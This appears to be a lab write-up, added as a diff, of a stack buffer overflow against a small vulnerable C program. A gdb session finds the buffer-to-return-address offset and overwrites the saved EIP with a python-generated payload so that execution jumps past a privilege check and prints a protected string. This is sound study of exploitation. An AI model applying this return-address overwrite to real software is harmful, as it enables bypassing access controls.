@@ -1,0 +1,112 @@
+$ make
+gcc -g -mpreferred-stack-boundary=2 -march=i386 -o jump jump.c
+$ gdb -q jump
+Reading symbols from jump...done.
+(gdb) disass main
+Dump of assembler code for function main:
+   0x08048442 <+0>:	push   ebp
+   0x08048443 <+1>:	mov    ebp,esp
+   0x08048445 <+3>:	sub    esp,0x34
+   0x08048448 <+6>:	cmp    DWORD PTR [ebp+0x8],0x2
+   0x0804844c <+10>:	je     0x8048469 <main+39>
+   0x0804844e <+12>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048451 <+15>:	push   DWORD PTR [eax]
+   0x08048453 <+17>:	push   0x80485e5
+   0x08048458 <+22>:	call   0x8048340 <printf@plt>
+   0x0804845d <+27>:	add    esp,0x8
+   0x08048460 <+30>:	mov    DWORD PTR [ebp-0x34],0xffffffff
+   0x08048467 <+37>:	jmp    0x80484e1 <main+159>
+   0x08048469 <+39>:	push   0x80485f5
+   0x0804846e <+44>:	push   0x80485fc
+   0x08048473 <+49>:	push   0x28
+   0x08048475 <+51>:	lea    eax,[ebp-0x30]
+   0x08048478 <+54>:	push   eax
+   0x08048479 <+55>:	call   0x8048380 <snprintf@plt>
+   0x0804847e <+60>:	add    esp,0x10
+   0x08048481 <+63>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048484 <+66>:	add    eax,0x4
+   0x08048487 <+69>:	push   DWORD PTR [eax]
+   0x08048489 <+71>:	lea    eax,[ebp-0x30]
+   0x0804848c <+74>:	push   eax
+   0x0804848d <+75>:	call   0x8048360 <strcat@plt>
+   0x08048492 <+80>:	add    esp,0x8
+   0x08048495 <+83>:	lea    eax,[ebp-0x30]
+   0x08048498 <+86>:	push   eax
+   0x08048499 <+87>:	push   0x80485ff
+   0x0804849e <+92>:	call   0x8048340 <printf@plt>
+   0x080484a3 <+97>:	add    esp,0x8
+   0x080484a6 <+100>:	call   0x8048350 <geteuid@plt>
+   0x080484ab <+105>:	test   eax,eax
+   0x080484ad <+107>:	jne    0x80484c4 <main+130>
+   0x080484af <+109>:	push   DWORD PTR ds:0x804a02c
+   0x080484b5 <+115>:	push   0x80485ff
+   0x080484ba <+120>:	call   0x8048340 <printf@plt>
+   0x080484bf <+125>:	add    esp,0x8
+   0x080484c2 <+128>:	jmp    0x80484da <main+152>
+   0x080484c4 <+130>:	push   0x8048604
+   0x080484c9 <+135>:	call   0x8048340 <printf@plt>
+   0x080484ce <+140>:	add    esp,0x4
+   0x080484d1 <+143>:	mov    DWORD PTR [ebp-0x34],0xffffffff
+   0x080484d8 <+150>:	jmp    0x80484e1 <main+159>
+   0x080484da <+152>:	mov    DWORD PTR [ebp-0x34],0x0
+   0x080484e1 <+159>:	mov    eax,DWORD PTR [ebp-0x34]
+   0x080484e4 <+162>:	leave  
+   0x080484e5 <+163>:	ret    
+End of assembler dump.
+(gdb) p magic
+$1 = 0x80485a8 "One string to bring them all, and in the darkness bind them."
+(gdb) p &magic
+$2 = (char **) 0x804a02c <magic>
+
+The code we want to execute is located at 0x080484af <main+109>.
+Let's look at the assembly :
+   0x080484af <+109>:   push   DWORD PTR ds:0x804a02c  ; push pointer to string (in datasection)
+   0x080484b5 <+115>:   push   0x80485ff               ; push another argument ("%s\n")
+   0x080484ba <+120>:   call   0x8048340 <printf@plt>  ; call printf to display string
+This is the code responsible of displaying our string.
+
+Let's see the space between overlowable buffer and main return address
+(gdb) b main
+Breakpoint 1 at 0x8048448: file jump.c, line 17.
+(gdb) r
+Starting program: /home/lain/cvuln/jump/jump 
+
+Breakpoint 1, main (argc=1, argv=0xbffff514) at jump.c:17
+17	  if (argc != 2) {
+(gdb) info frame
+Stack level 0, frame at 0xbffff480:
+ eip = 0x8048448 in main (jump.c:17); 
+    saved eip = 0xb7e0c5a6
+ source language c.
+ Arglist at 0xbffff478, args: argc=1, argv=0xbffff514
+ Locals at 0xbffff478, Previous frame's sp is 0xbffff480
+ Saved registers:
+  ebp at 0xbffff478, eip at 0xbffff47c
+(gdb) p &buffer
+$3 = (char (*)[40]) 0xbffff448
+(gdb) r $(python -c 'print("A"*46+"\xaf\x84\x04\x08")')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/lain/cvuln/jump/jump $(python -c 'print("A"*46+"\xaf\x84\x04\x08")')
+
+Breakpoint 1, main (argc=2, argv=0xbffff4e4) at jump.c:17
+17	  if (argc != 2) {
+(gdb) c
+Continuing.
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA¯
+Forget it. You do not have access to the magic string.
+One string to bring them all, and in the darkness bind them.
+
+Program received signal SIGSEGV, Segmentation fault.
+main (argc=<error reading variable: Cannot access memory at address 0x41414149>, 
+    argv=<error reading variable: Cannot access memory at address 0x4141414d>) at jump.c:39
+39	  return (0);
+(gdb) q
+A debugging session is active.
+
+	Inferior 1 [process 2567] will be killed.
+
+Quit anyway? (y or n) y
+
+Then we tried to reach eip and rewrite it by the address we want to jump to (0x080484af)
+to display the string. Note that the program crashes when it tries to re-use ebp value.
